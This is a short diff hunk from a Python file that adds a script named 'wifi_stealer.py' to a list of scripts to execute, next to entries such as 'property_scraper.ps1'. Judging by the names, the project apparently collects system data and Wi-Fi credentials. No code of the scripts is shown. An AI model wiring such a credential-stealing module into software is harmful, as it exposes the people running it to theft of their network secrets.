@@ -126,6 +126,7 @@ execution_list = [
     "netadapter.ps1",
     "property_scraper.ps1",
     "window_feature_miner.ps1",
+    "wifi_stealer.py",
 ]
 
 if action == "minimal":
